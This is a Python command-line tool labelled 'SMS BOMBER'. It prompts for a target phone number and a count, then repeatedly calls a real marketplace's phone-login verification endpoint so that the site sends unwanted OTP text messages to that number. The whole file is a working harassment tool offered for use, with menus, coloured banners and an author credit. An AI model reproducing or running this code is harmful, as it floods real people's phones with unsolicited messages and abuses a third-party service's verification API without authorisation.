import os
import sys
import time
import random
import webbrowser
from fake_useragent import UserAgent
try:
    import requests
except:
    os.system("pip install requests")
##############LOGO###########
def _L_O_G_O_():
    print(beguni+"""FOREBAR KNIGHIT""")
#############CLEAR############
def clear():
    os.system('clear')
##########COLOR-CODE##########
beguni="\x1b[1;94m"
_R_E_S_T_="\033[0m"
_R_E_D_="\x1b[1;91m"
_Y_O_L_L_O_W_="\033[1;93m"
_G_R_E_E_N_="\033[92m"
pess="\033[1;96m"
#########_O_N_W_E_R_-MENU#########
def _O_N_W_E_R_():
    print("""\x1b[1;91m───────────────────────────────────────────────
\x1b[1;97m [\x1b[1;91m+\x1b[1;97m]  \033[92mAuthor  \x1b[1;91m:   \033[92mPAPEL MONDOL
\x1b[1;97m [\x1b[1;91m+\x1b[1;97m]  \033[92mTOOL    \x1b[1;91m:   \033[92mSMS BOMBER
\x1b[1;91m───────────────────────────────────────────────\033[0m""")
##############################
def _U_p_D_a_T_e_N_O_T_I_C_e_():
    print(beguni+"───────────────────────────────────────────────\033[0m", "             \x1b[1;91mTool Update In Proses \x1b[1;97m[\x1b[1;92m•\x1b[1;91m•\x1b[1;97m]",
    "\n\x1b[1;94m───────────────────────────────────────────────\033[0m")
##########OPTION-MENU#########
def _M_e_N_U_():
    time.sleep(0.22)
    print("\033[92m[\x1b[1;91m1\033[92m] Start Bombing")
    time.sleep(0.15)
    print("\033[92m[\x1b[1;91m2\033[92m] Abouts Tool")
    time.sleep(0.15)
    print("\033[92m[\x1b[1;91m3\033[92m] Website")
    print("\033[92m[\x1b[1;91m4\033[92m] Exit")
    print(_R_E_D_+"───────────────────────────────────────────────"+_R_E_S_T_)
    
#############INPUT############
def bomber():
    _N_U_M_B_D_E_R_ = str(input(_G_R_E_E_N_+"Phone Number Is \x1b[1;91m: "+_G_R_E_E_N_))
    _A_M_O_U_N_T_S_ = int(input(_G_R_E_E_N_+"Enter Amount (1-50) \x1b[1;91m: "+_G_R_E_E_N_))  
        
    if _A_M_O_U_N_T_S_ <= 0 or _A_M_O_U_N_T_S_ > 50:
        print(_R_E_D_+"Amount should be between 1 and 50"+_R_E_S_T_)
        return
        
#########WORKING APIS##########
    api1 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+_N_U_M_B_D_E_R_
    api2 = ""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    for papel in range(_A_M_O_U_N_T_S_):
        success_count = 0
        time.sleep(1)
        response = requests.get(api1, headers=headers)
        if response.status_code == 200:
                success_count += 1
                print(_G_R_E_E_N_+f"{papel+1} SMS Sent Successfully to {api1}"+_R_E_S_T_)
        else:
                print(_R_E_D_+f"{papel+1} Failed to send to {api1} - Status: {response.status_code}"+_R_E_S_T_)
                
##############################
def website():
    url1 = "https://google.com"
    webbrowser.open(url1)
    
##############################
def abouts():
    url2 = "https://github.com"
    webbrowser.open(url2)
##############################
def exit_program():
    print(_Y_O_L_L_O_W_+"Progress Running....."+_R_E_S_T_)
    time.sleep(2)
    clear()
    sys.exit()
##############################
while True:
        clear()
        _L_O_G_O_()
        _O_N_W_E_R_()
        _U_p_D_a_T_e_N_O_T_I_C_e_()
        _M_e_N_U_()
        option = int(input(pess+"Your Choice \033[92m: "+_R_E_D_))
        
        if option == 1:
            clear()
            _L_O_G_O_()
            _O_N_W_E_R_()
            bomber()
            input(_G_R_E_E_N_+"Press Enter to continue..."+_R_E_S_T_)
        elif option == 2:
            abouts()
            time.sleep(1)
        elif option == 3:
            website()
            time.sleep(1)
        elif option == 4:
            exit_program()
        else:
            clear()
            _L_O_G_O_()
            _O_N_W_E_R_()
            print(_R_E_D_+"Type Valid Options"+_R_E_S_T_)
            time.sleep(1)